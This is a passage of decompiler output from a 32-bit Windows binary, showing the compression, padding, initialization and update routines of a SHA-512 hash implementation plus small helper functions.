    LODWORD(v50) = v152 & v197 ^ v166 & ~v152;
    v75 = v139 + __PAIR64__(v112, v123) + v42[8] + v50 + v58;
    v76 = v75 + v66;
    v207 = (v75 + v66) >> 32;
    v192 = v76;
    v135 = v75
         + __PAIR64__(
             ((__PAIR64__(v218, v157)
             + v129
             + v42[7]
             + __PAIR64__(
                 ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
                 v197 & v166 ^ v139 & ~v197)
             + __PAIR64__(
                 v213 & v175 ^ HIDWORD(v139) & ~v213,
                 (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
             + (v73 & v70 ^ v66 & (v73 ^ v70))
             + __PAIR64__(
                 (v73 >> 7) ^ (v73 >> 2) ^ ((HIDWORD(v73) >> 28) | (16 * v73)),
                 (((_DWORD)v73 << 25) | (HIDWORD(v73) >> 7)) ^ (((_DWORD)v73 << 30) | (HIDWORD(v73) >> 2)) ^ (v73 >> 28))) >> 7) ^ ((__PAIR64__(v218, v157) + v129 + v42[7] + __PAIR64__(((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9), v197 & v166 ^ v139 & ~v197) + __PAIR64__(v213 & v175 ^ HIDWORD(v139) & ~v213, (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9))) + (v73 & v70 ^ v66 & (v73 ^ v70)) + __PAIR64__((v73 >> 7) ^ (v73 >> 2) ^ ((HIDWORD(v73) >> 28) | (16 * v73)), (((_DWORD)v73 << 25) | (HIDWORD(v73) >> 7)) ^ (((_DWORD)v73 << 30) | (HIDWORD(v73) >> 2)) ^ (v73 >> 28))) >> 2) ^ ((v162 >> 28) | (16 * v146)),
             v73 & v70 ^ v146 & (v73 ^ v70))
         + __PAIR64__(
             HIDWORD(v73) & HIDWORD(v70) ^ v162 & (HIDWORD(v73) ^ HIDWORD(v70)),
             ((v146 << 25) | (v162 >> 7)) ^ ((v146 << 30) | (v162 >> 2)) ^ ((__PAIR64__(v218, v157)
                                                                           + v129
                                                                           + v42[7]
                                                                           + __PAIR64__(
                                                                               ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
                                                                               v197 & v166 ^ v139 & ~v197)
                                                                           + __PAIR64__(
                                                                               v213 & v175 ^ HIDWORD(v139) & ~v213,
                                                                               (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
                                                                           + (v73 & v70 ^ v66 & (v73 ^ v70))
                                                                           + __PAIR64__(
                                                                               (v73 >> 7) ^ (v73 >> 2) ^ ((HIDWORD(v73) >> 28) | (16 * v73)),
                                                                               (((_DWORD)v73 << 25) | (HIDWORD(v73) >> 7)) ^ (((_DWORD)v73 << 30) | (HIDWORD(v73) >> 2)) ^ (v73 >> 28))) >> 28));
    v77 = __PAIR64__(v113, HIDWORD(v113))
        + __PAIR64__(
            (HIDWORD(v129) >> 6) ^ (v129 >> 29) ^ ((HIDWORD(v129) >> 19) | ((_DWORD)v129 << 13)),
            (v129 >> 6) ^ ((8 * v129) | (HIDWORD(v129) >> 29)) ^ (v129 >> 19))
        + __PAIR64__(
            (v122 >> 7) ^ ((v122 >> 1) | (v118 << 31)) ^ ((v122 >> 8) | (v118 << 24)),
            (__PAIR64__(v122, v118) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v122, v118)) >> 32) ^ (__PAIR64__(v122, v118) >> 8))
        + __PAIR64__(v125, HIDWORD(v125));
    LODWORD(v125) = HIDWORD(v77);
    HIDWORD(v125) = v77;
    HIDWORD(v75) = ((v207 >> 14) | (v76 << 18)) ^ ((v207 >> 18) | (v76 << 14)) ^ ((v75 + v66) >> 9);
    LODWORD(v50) = v192 & v152 ^ v197 & ~v192;
    HIDWORD(v50) = v207 & v202 ^ v213 & v207;
    LODWORD(v75) = (__PAIR64__(v207, v192) >> 14) ^ (__PAIR64__(v207, v192) >> 18) ^ ((v192 << 23) | (v207 >> 9));
    v78 = __PAIR64__(v175, v166) + __PAIR64__(v125, HIDWORD(v125)) + v42[9] + v50 + v75;
    v79 = v78 + v70;
    LODWORD(v183) = HIDWORD(v79);
    HIDWORD(v183) = v79;
    v167 = v78
         + (v73 & v135 ^ v146 & (v73 ^ v135))
         + ((((_DWORD)v135 << 25) | (HIDWORD(v135) >> 7)) ^ (((_DWORD)v135 << 30) | (HIDWORD(v135) >> 2)) ^ (v135 >> 28));
    v176 = (v78
          + __PAIR64__(
              HIDWORD(v73) & HIDWORD(v135) ^ v162 & (HIDWORD(v73) ^ HIDWORD(v135)),
              v73 & v135 ^ v146 & (v73 ^ v135))
          + __PAIR64__(
              (v135 >> 7) ^ (v135 >> 2) ^ ((HIDWORD(v135) >> 28) | (16 * v135)),
              (((_DWORD)v135 << 25) | (HIDWORD(v135) >> 7)) ^ (((_DWORD)v135 << 30) | (HIDWORD(v135) >> 2)) ^ (v135 >> 28))) >> 32;
    v80 = __PAIR64__(v111, HIDWORD(v111))
        + __PAIR64__(
            (v112 >> 6) ^ (__PAIR64__(v112, v123) >> 29) ^ ((v112 >> 19) | (v123 << 13)),
            (__PAIR64__(v112, v123) >> 6) ^ ((8 * v123) | (v112 >> 29)) ^ (__PAIR64__(v112, v123) >> 19))
        + __PAIR64__(
            ((unsigned int)v120 >> 7) ^ (v120 >> 1) ^ (v120 >> 8),
            (__PAIR64__(v120, HIDWORD(v120)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v120, HIDWORD(v120))) >> 32) ^ (__PAIR64__(v120, HIDWORD(v120)) >> 8))
        + __PAIR64__(v122, v118);
    v122 = HIDWORD(v80);
    v118 = v80;
    HIDWORD(v75) = (v183 >> 14) ^ (v183 >> 18) ^ ((v78 + v70) >> 9);
    HIDWORD(v50) = v183 & v207 ^ v202 & ~(_DWORD)v183;
    LODWORD(v50) = HIDWORD(v183) & v76 ^ v152 & ~HIDWORD(v183);
    LODWORD(v75) = ((v78 + v70) >> 14) ^ ((v78 + v70) >> 18) ^ (v183 >> 9);
    v81 = __PAIR64__(v213, v197) + __PAIR64__(v122, v118) + v42[10] + v50 + v75;
    v220 = v81 + v73;
    v223 = (v81 + v73) >> 32;
    v198 = v81
         + (v167 & v135 ^ v146 & (v167 ^ v135))
         + (((v167 << 25) | (v176 >> 7)) ^ ((v167 << 30) | (v176 >> 2)) ^ ((v78
                                                                          + __PAIR64__(
                                                                              HIDWORD(v73) & HIDWORD(v135) ^ v162 & (HIDWORD(v73) ^ HIDWORD(v135)),
                                                                              v73 & v135 ^ v146 & (v73 ^ v135))
                                                                          + __PAIR64__(
                                                                              (v135 >> 7) ^ (v135 >> 2) ^ ((HIDWORD(v135) >> 28) | (16 * v135)),
                                                                              (((_DWORD)v135 << 25) | (HIDWORD(v135) >> 7)) ^ (((_DWORD)v135 << 30) | (HIDWORD(v135) >> 2)) ^ (v135 >> 28))) >> 28));
    v214 = (v81
          + __PAIR64__(v176 & HIDWORD(v135) ^ v162 & (v176 ^ HIDWORD(v135)), v167 & v135 ^ v146 & (v167 ^ v135))
          + __PAIR64__(
              ((v78
              + __PAIR64__(
                  HIDWORD(v73) & HIDWORD(v135) ^ v162 & (HIDWORD(v73) ^ HIDWORD(v135)),
                  v73 & v135 ^ v146 & (v73 ^ v135))
              + __PAIR64__(
                  (v135 >> 7) ^ (v135 >> 2) ^ ((HIDWORD(v135) >> 28) | (16 * v135)),
                  (((_DWORD)v135 << 25) | (HIDWORD(v135) >> 7)) ^ (((_DWORD)v135 << 30) | (HIDWORD(v135) >> 2)) ^ (v135 >> 28))) >> 7) ^ ((v78 + __PAIR64__(HIDWORD(v73) & HIDWORD(v135) ^ v162 & (HIDWORD(v73) ^ HIDWORD(v135)), v73 & v135 ^ v146 & (v73 ^ v135)) + __PAIR64__((v135 >> 7) ^ (v135 >> 2) ^ ((HIDWORD(v135) >> 28) | (16 * v135)), (((_DWORD)v135 << 25) | (HIDWORD(v135) >> 7)) ^ (((_DWORD)v135 << 30) | (HIDWORD(v135) >> 2)) ^ (v135 >> 28))) >> 2) ^ ((v176 >> 28) | (16 * v167)),
              ((v167 << 25) | (v176 >> 7)) ^ ((v167 << 30) | (v176 >> 2)) ^ ((v78
                                                                            + __PAIR64__(
                                                                                HIDWORD(v73) & HIDWORD(v135) ^ v162 & (HIDWORD(v73) ^ HIDWORD(v135)),
                                                                                v73 & v135 ^ v146 & (v73 ^ v135))
                                                                            + __PAIR64__(
                                                                                (v135 >> 7) ^ (v135 >> 2) ^ ((HIDWORD(v135) >> 28) | (16 * v135)),
                                                                                (((_DWORD)v135 << 25) | (HIDWORD(v135) >> 7)) ^ (((_DWORD)v135 << 30) | (HIDWORD(v135) >> 2)) ^ (v135 >> 28))) >> 28))) >> 32;
    v82 = __PAIR64__(v124, HIDWORD(v124))
        + __PAIR64__(
            ((unsigned int)v125 >> 6) ^ (__PAIR64__(v125, HIDWORD(v125)) >> 29) ^ (v125 >> 19),
            (__PAIR64__(v125, HIDWORD(v125)) >> 6) ^ (v125 >> 29) ^ (__PAIR64__(v125, HIDWORD(v125)) >> 19))
        + __PAIR64__(
            ((unsigned int)v127 >> 7) ^ (v127 >> 1) ^ (v127 >> 8),
            (__PAIR64__(v127, HIDWORD(v127)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v127, HIDWORD(v127))) >> 32) ^ (__PAIR64__(v127, HIDWORD(v127)) >> 8))
        + __PAIR64__(v120, HIDWORD(v120));
    LODWORD(v120) = HIDWORD(v82);
    HIDWORD(v120) = v82;
    HIDWORD(v75) = ((v223 >> 14) | (v220 << 18)) ^ ((v223 >> 18) | (v220 << 14)) ^ ((v81 + v73) >> 9);
    HIDWORD(v50) = v223 & ((v78 + v70) >> 32) ^ v207 & ~v223;
    LODWORD(v75) = ((v81 + v73) >> 14) ^ ((v81 + v73) >> 18) ^ ((((_DWORD)v81 + (_DWORD)v73) << 23) | (v223 >> 9));
    LODWORD(v50) = v220 & (v78 + v70) ^ v76 & ~v220;
    v83 = __PAIR64__(v202, v152) + __PAIR64__(v120, HIDWORD(v120)) + v42[11] + v50 + v75;
    v84 = v83 + __PAIR64__(v162, v146);
    v161 = HIDWORD(v84);
    v145 = v84;
    LODWORD(v50) = v198 & v167 ^ v135 & (v198 ^ v167);
    HIDWORD(v50) = v214 & v176 ^ HIDWORD(v135) & (v214 ^ v176);
    v180 = v83 + v50 + (((v198 << 25) | (v214 >> 7)) ^ ((v198 << 30) | (v214 >> 2)) ^ (__PAIR64__(v214, v198) >> 28));
    v199 = (v83
          + v50
          + __PAIR64__(
              (__PAIR64__(v214, v198) >> 7) ^ (__PAIR64__(v214, v198) >> 2) ^ ((v214 >> 28) | (16 * v198)),
              ((v198 << 25) | (v214 >> 7)) ^ ((v198 << 30) | (v214 >> 2)) ^ (__PAIR64__(v214, v198) >> 28))) >> 32;
    v85 = __PAIR64__(v121, HIDWORD(v121))
        + __PAIR64__(
            (v122 >> 6) ^ (__PAIR64__(v122, v118) >> 29) ^ ((v122 >> 19) | (v118 << 13)),
            (__PAIR64__(v122, v118) >> 6) ^ ((8 * v118) | (v122 >> 29)) ^ (__PAIR64__(v122, v118) >> 19))
        + __PAIR64__(
            ((unsigned int)v126 >> 7) ^ (v126 >> 1) ^ (v126 >> 8),
            (__PAIR64__(v126, HIDWORD(v126)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v126, HIDWORD(v126))) >> 32) ^ (__PAIR64__(v126, HIDWORD(v126)) >> 8))
        + __PAIR64__(v127, HIDWORD(v127));
    LODWORD(v127) = HIDWORD(v85);
    HIDWORD(v127) = v85;
    HIDWORD(v75) = ((v161 >> 14) | (v145 << 18)) ^ ((v161 >> 18) | (v145 << 14)) ^ (__PAIR64__(v161, v145) >> 9);
    LODWORD(v50) = (v81 + v73) & v145 ^ (v78 + v70) & ~v145;
    HIDWORD(v50) = v223 & v161 ^ ((v78 + v70) >> 32) & ~v161;
    LODWORD(v75) = (__PAIR64__(v161, v145) >> 14) ^ (__PAIR64__(v161, v145) >> 18) ^ ((v145 << 23) | (v161 >> 9));
    v86 = __PAIR64__(v207, v76) + __PAIR64__(v127, HIDWORD(v127)) + v42[12] + v50 + v75;
    v134 = v86 + v135;
    HIDWORD(v50) = v199 & v214 ^ v176 & (v199 ^ v214);
    LODWORD(v50) = v180 & v198 ^ v167 & (v180 ^ v198);
    v189 = v86 + v50 + (((v180 << 25) | (v199 >> 7)) ^ ((v180 << 30) | (v199 >> 2)) ^ (__PAIR64__(v199, v180) >> 28));
    v204 = (v86
          + v50
          + __PAIR64__(
              (__PAIR64__(v199, v180) >> 7) ^ (__PAIR64__(v199, v180) >> 2) ^ ((v199 >> 28) | (16 * v180)),
              ((v180 << 25) | (v199 >> 7)) ^ ((v180 << 30) | (v199 >> 2)) ^ (__PAIR64__(v199, v180) >> 28))) >> 32;
    v87 = __PAIR64__(v119, HIDWORD(v119))
        + __PAIR64__(
            ((unsigned int)v120 >> 6) ^ (__PAIR64__(v120, HIDWORD(v120)) >> 29) ^ (v120 >> 19),
            (__PAIR64__(v120, HIDWORD(v120)) >> 6) ^ (v120 >> 29) ^ (__PAIR64__(v120, HIDWORD(v120)) >> 19))
        + __PAIR64__(
            ((unsigned int)v131 >> 7) ^ (v131 >> 1) ^ (v131 >> 8),
            (__PAIR64__(v131, HIDWORD(v131)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v131, HIDWORD(v131))) >> 32) ^ (__PAIR64__(v131, HIDWORD(v131)) >> 8))
        + __PAIR64__(v126, HIDWORD(v126));
    LODWORD(v126) = HIDWORD(v87);
    HIDWORD(v126) = v87;
    HIDWORD(v75) = ((HIDWORD(v134) >> 14) | ((_DWORD)v134 << 18)) ^ ((HIDWORD(v134) >> 18) | ((_DWORD)v134 << 14)) ^ (v134 >> 9);
    HIDWORD(v50) = HIDWORD(v134) & v161 ^ v223 & ~HIDWORD(v134);
    LODWORD(v75) = (v134 >> 14) ^ (v134 >> 18) ^ (((_DWORD)v134 << 23) | (HIDWORD(v134) >> 9));
    LODWORD(v50) = v134 & v145 ^ (v81 + v73) & ~(_DWORD)v134;
    v88 = v78 + v70 + __PAIR64__(v126, HIDWORD(v126)) + v42[13] + v50 + v75;
    v89 = v88 + __PAIR64__(v176, v167);
    v173 = HIDWORD(v89);
    v164 = v89;
    LODWORD(v50) = v189 & v180 ^ v198 & (v189 ^ v180);
    HIDWORD(v50) = v204 & v199 ^ v214 & (v204 ^ v199);
    HIDWORD(v182) = v88
                  + v50
                  + (((v189 << 25) | (v204 >> 7)) ^ ((v189 << 30) | (v204 >> 2)) ^ (__PAIR64__(v204, v189) >> 28));
    LODWORD(v182) = (v88
                   + v50
                   + __PAIR64__(
                       (__PAIR64__(v204, v189) >> 7) ^ (__PAIR64__(v204, v189) >> 2) ^ ((v204 >> 28) | (16 * v189)),
                       ((v189 << 25) | (v204 >> 7)) ^ ((v189 << 30) | (v204 >> 2)) ^ (__PAIR64__(v204, v189) >> 28))) >> 32;
    v90 = v129
        + __PAIR64__(
            ((unsigned int)v115 >> 7) ^ (v115 >> 1) ^ (v115 >> 8),
            (__PAIR64__(v115, HIDWORD(v115)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v115, HIDWORD(v115))) >> 32) ^ (__PAIR64__(v115, HIDWORD(v115)) >> 8))
        + __PAIR64__(
            ((unsigned int)v127 >> 6) ^ (__PAIR64__(v127, HIDWORD(v127)) >> 29) ^ (v127 >> 19),
            (__PAIR64__(v127, HIDWORD(v127)) >> 6) ^ (v127 >> 29) ^ (__PAIR64__(v127, HIDWORD(v127)) >> 19))
        + __PAIR64__(v131, HIDWORD(v131));
    LODWORD(v131) = HIDWORD(v90);
    HIDWORD(v131) = v90;
    HIDWORD(v75) = ((v173 >> 14) | (v164 << 18)) ^ ((v173 >> 18) | (v164 << 14)) ^ (__PAIR64__(v173, v164) >> 9);
    HIDWORD(v50) = v173 & HIDWORD(v134) ^ v161 & ~v173;
    LODWORD(v75) = (__PAIR64__(v173, v164) >> 14) ^ (__PAIR64__(v173, v164) >> 18) ^ ((v164 << 23) | (v173 >> 9));
    LODWORD(v50) = v164 & v134 ^ v145 & ~v164;
    v91 = v81 + v73 + __PAIR64__(v131, HIDWORD(v131)) + v42[14] + v50 + v75;
    v92 = v91 + __PAIR64__(v214, v198);
    v211 = HIDWORD(v92);
    v195 = v92;
    v224 = (v182 >> 7) ^ (v182 >> 2) ^ (__PAIR64__(v182, HIDWORD(v182)) >> 28);
    LODWORD(v50) = HIDWORD(v182) & v189 ^ v180 & (HIDWORD(v182) ^ v189);
    HIDWORD(v50) = v182 & v204 ^ v199 & (v182 ^ v204);
    v93 = (v50
         + __PAIR64__(
             (__PAIR64__(v182, HIDWORD(v182)) >> 7) ^ (__PAIR64__(v182, HIDWORD(v182)) >> 2) ^ (v182 >> 28),
             v224)) >> 32;
    v94 = v50 + v224;
    v221 = v91 + v50 + v224;
    v42 += 16;
    v170 = (v91 + __PAIR64__(v93, v94)) >> 32;
  }
  while ( (int)v42 < (int)&dword_408970 );
  result = a1;
  v96 = v91 + __PAIR64__(v93, v94) + *(_QWORD *)a1;
  *a1 = v96;
  a1[2] = HIDWORD(v182) + v102;
  a1[3] = v182 + __CFADD__(HIDWORD(v182), v102) + v101;
  *((_QWORD *)a1 + 2) = __PAIR64__(v99, v189) + __PAIR64__(v204, v100);
  *((_QWORD *)a1 + 3) = __PAIR64__(v97, v180) + __PAIR64__(v199, v98);
  *((_QWORD *)a1 + 4) = __PAIR64__(v211, v195) + v110;
  *((_QWORD *)a1 + 5) = __PAIR64__(v108, v164) + __PAIR64__(v173, v109);
  *((_QWORD *)a1 + 6) = v134 + __PAIR64__(v106, v107);
  a1[1] = HIDWORD(v96);
  a1[14] = v145 + v105;
  a1[15] = v161 + __CFADD__(v145, v105) + v104;
  return result;
}
// 408970: using guessed type int dword_408970;

//----- (004070F0) --------------------------------------------------------
unsigned int *__cdecl sub_4070F0(_BYTE *a1, int a2)
{
  unsigned __int8 *v2; // ebx
  int v3; // edi
  unsigned int v4; // edi
  bool v5; // zf
  unsigned int v6; // ecx
  unsigned __int8 *v7; // edi
  unsigned int v8; // ecx
  unsigned __int8 *v9; // edi
  unsigned int *result; // eax
  int v11; // ecx
  unsigned int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  int v16; // edx
  int v17; // ecx
  int v18; // edx
  int v19; // ecx
  int v20; // edx
  int v21; // ecx
  int v22; // edx
  int v23; // ecx
  int v24; // edx
  int v25; // ecx
  unsigned int v26; // edx

  v2 = (unsigned __int8 *)(a2 + 80);
  v3 = *(_DWORD *)(a2 + 208);
  *(_BYTE *)(v3 + a2 + 80) = 0x80;
  v4 = v3 + 1;
  if ( v4 > 0x70 )
  {
    v6 = 128 - v4;
    v5 = v4 == 128;
    v7 = &v2[v4];
    if ( !v5 )
      memset(v7, 0, v6);
    v4 = 0;
    sub_403450((unsigned int *)a2, v2);
  }
  v8 = 112 - v4;
  v5 = v4 == 112;
  v9 = &v2[v4];
  if ( !v5 )
    memset(v9, 0, v8);
  *(_BYTE *)(a2 + 207) = *(_BYTE *)(a2 + 64);
  *(_BYTE *)(a2 + 206) = BYTE1(*(_QWORD *)(a2 + 64));
  *(_BYTE *)(a2 + 205) = BYTE2(*(_DWORD *)(a2 + 64));
  *(_BYTE *)(a2 + 204) = HIBYTE(*(_DWORD *)(a2 + 64));
  *(_BYTE *)(a2 + 203) = sub_407690(*(_QWORD *)(a2 + 64), 0x20u);
  *(_BYTE *)(a2 + 202) = sub_407690(*(_QWORD *)(a2 + 64), 0x28u);
  *(_BYTE *)(a2 + 201) = *(_BYTE *)(a2 + 70);
  *(_BYTE *)(a2 + 200) = *(_BYTE *)(a2 + 71);
  *(_BYTE *)(a2 + 199) = *(_BYTE *)(a2 + 72);
  *(_BYTE *)(a2 + 198) = BYTE1(*(_QWORD *)(a2 + 72));
  *(_BYTE *)(a2 + 197) = BYTE2(*(_DWORD *)(a2 + 72));
  *(_BYTE *)(a2 + 196) = HIBYTE(*(_DWORD *)(a2 + 72));
  *(_BYTE *)(a2 + 195) = sub_407690(*(_QWORD *)(a2 + 72), 0x20u);
  *(_BYTE *)(a2 + 194) = sub_407690(*(_QWORD *)(a2 + 72), 0x28u);
  *(_BYTE *)(a2 + 193) = *(_BYTE *)(a2 + 78);
  *(_BYTE *)(a2 + 192) = *(_BYTE *)(a2 + 79);
  result = sub_403450((unsigned int *)a2, v2);
  if ( a1 )
  {
    v11 = *(_DWORD *)(a2 + 4);
    v12 = *(_DWORD *)a2;
    *a1 = HIBYTE(v11);
    a1[1] = BYTE2(v11);
    a1[2] = BYTE1(v11);
    a1[3] = v11;
    a1[4] = HIBYTE(v12);
    a1[5] = BYTE2(v12);
    a1[6] = BYTE1(v12);
    a1[7] = v12;
    v13 = *(_DWORD *)(a2 + 12);
    v14 = *(_DWORD *)(a2 + 8);
    a1[8] = HIBYTE(v13);
    a1[9] = BYTE2(v13);
    a1[10] = BYTE1(v13);
    a1[11] = v13;
    a1[12] = HIBYTE(v14);
    a1[13] = BYTE2(v14);
    a1[14] = BYTE1(v14);
    a1[15] = v14;
    v15 = *(_DWORD *)(a2 + 20);
    v16 = *(_DWORD *)(a2 + 16);
    a1[16] = HIBYTE(v15);
    a1[17] = BYTE2(v15);
    a1[18] = BYTE1(v15);
    a1[19] = v15;
    a1[20] = HIBYTE(v16);
    a1[21] = BYTE2(v16);
    a1[22] = BYTE1(v16);
    a1[23] = v16;
    v17 = *(_DWORD *)(a2 + 28);
    v18 = *(_DWORD *)(a2 + 24);
    a1[24] = HIBYTE(v17);
    a1[25] = BYTE2(v17);
    a1[26] = BYTE1(v17);
    a1[27] = v17;
    a1[28] = HIBYTE(v18);
    a1[29] = BYTE2(v18);
    a1[30] = BYTE1(v18);
    a1[31] = v18;
    v19 = *(_DWORD *)(a2 + 36);
    v20 = *(_DWORD *)(a2 + 32);
    a1[32] = HIBYTE(v19);
    a1[33] = BYTE2(v19);
    a1[34] = BYTE1(v19);
    a1[35] = v19;
    a1[36] = HIBYTE(v20);
    a1[37] = BYTE2(v20);
    a1[38] = BYTE1(v20);
    a1[39] = v20;
    v21 = *(_DWORD *)(a2 + 44);
    v22 = *(_DWORD *)(a2 + 40);
    a1[40] = HIBYTE(v21);
    a1[41] = BYTE2(v21);
    a1[42] = BYTE1(v21);
    a1[43] = v21;
    a1[44] = HIBYTE(v22);
    a1[45] = BYTE2(v22);
    a1[46] = BYTE1(v22);
    a1[47] = v22;
    v23 = *(_DWORD *)(a2 + 52);
    v24 = *(_DWORD *)(a2 + 48);
    a1[48] = HIBYTE(v23);
    a1[49] = BYTE2(v23);
    a1[50] = BYTE1(v23);
    a1[51] = v23;
    a1[52] = HIBYTE(v24);
    a1[53] = BYTE2(v24);
    a1[54] = BYTE1(v24);
    a1[55] = v24;
    v25 = *(_DWORD *)(a2 + 60);
    v26 = *(_DWORD *)(a2 + 56);
    a1[56] = HIBYTE(v25);
    a1[57] = BYTE2(v25);
    a1[58] = BYTE1(v25);
    a1[59] = v25;
    a1[60] = HIBYTE(v26);
    a1[61] = BYTE2(v26);
    result = (unsigned int *)(v26 >> 8);
    a1[62] = BYTE1(v26);
    a1[63] = v26;
  }
  return result;
}

//----- (00407400) --------------------------------------------------------
_DWORD *__cdecl sub_407400(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = -205731576;
  a1[1] = 1779033703;
  a1[2] = -2067093701;
  a1[3] = -1150833019;
  a1[4] = -23791573;
  a1[5] = 1013904242;
  a1[6] = 1595750129;
  a1[7] = -1521486534;
  a1[8] = -1377402159;
  a1[9] = 1359893119;
  a1[10] = 725511199;
  a1[11] = -1694144372;
  a1[12] = -79577749;
  a1[13] = 528734635;
  a1[14] = 327033209;
  a1[15] = 1541459225;
  a1[16] = 0;
  a1[17] = 0;
  a1[18] = 0;
  a1[19] = 0;
  a1[52] = 0;
  a1[53] = 64;
  return result;
}

//----- (004074B0) --------------------------------------------------------
int __cdecl sub_4074B0(int a1, unsigned __int8 *a2, unsigned int a3)
{
  unsigned int v4; // esi
  unsigned __int8 *v5; // edi
  unsigned __int64 v6; // rax
  int v7; // ecx
  unsigned int v8; // eax
  unsigned __int8 *v9; // ecx
  unsigned __int8 *v11; // [esp+Ch] [ebp-Ch]
  unsigned __int8 *v12; // [esp+20h] [ebp+8h]
  unsigned int v13; // [esp+28h] [ebp+10h]

  v4 = a3;
  v5 = a2;
  LODWORD(v6) = a1 + 80;
  v11 = (unsigned __int8 *)(a1 + 80);
  v12 = a2;
  if ( a3 )
  {
    v6 = *(_QWORD *)(a1 + 64) + 8i64 * a3;
    if ( v6 < *(_QWORD *)(a1 + 64) )
      ++*(_QWORD *)(a1 + 72);
    v7 = *(_DWORD *)(a1 + 208);
    *(_QWORD *)(a1 + 64) = v6;
    if ( v7 )
    {
      v8 = 128 - v7;
      v9 = (unsigned __int8 *)(a1 + 80 + v7);
      if ( a3 < v8 )
      {
        qmemcpy(v9, a2, a3);
        LODWORD(v6) = a3;
        *(_DWORD *)(a1 + 208) += a3;
        return v6;
      }
      qmemcpy(v9, a2, v8);
      v4 = a3 - v8;
      v5 = &a2[v8];
      *(_DWORD *)(a1 + 208) = 0;
      a3 -= v8;
      v12 = &a2[v8];
      LODWORD(v6) = sub_403450((unsigned int *)a1, (unsigned __int8 *)(a1 + 80));
    }
    if ( v4 >= 0x80 )
    {
      v13 = v4 >> 7;
      do
      {
        LODWORD(v6) = sub_403450((unsigned int *)a1, v5);
        v5 += 128;
        v4 -= 128;
        --v13;
      }
      while ( v13 );
      a3 = v4;
      v12 = v5;
    }
    if ( v4 )
    {
      qmemcpy(v11, v12, a3);
      LODWORD(v6) = a3;
      *(_DWORD *)(a1 + 208) = a3;
    }
  }
  return v6;
}

//----- (004075F0) --------------------------------------------------------
void __cdecl sub_4075F0(void *a1, const void *a2, unsigned int a3)
{
  qmemcpy(a1, a2, a3);
}

//----- (00407620) --------------------------------------------------------
unsigned __int64 __stdcall sub_407620(__int64 a1, __int64 a2)
{
  if ( HIDWORD(a1) | HIDWORD(a2) )
    return a1 * a2;
  else
    return (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;
}

//----- (00407690) --------------------------------------------------------
unsigned __int64 __usercall sub_407690@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  if ( a2 >= 0x40u )
    return 0i64;
  else
    return a1 >> a2;
}

// nfuncs=24 queued=23 decompiled=23 lumina nreq=0 worse=0 better=0
// ALL OK, 23 function(s) have been successfully decompiled
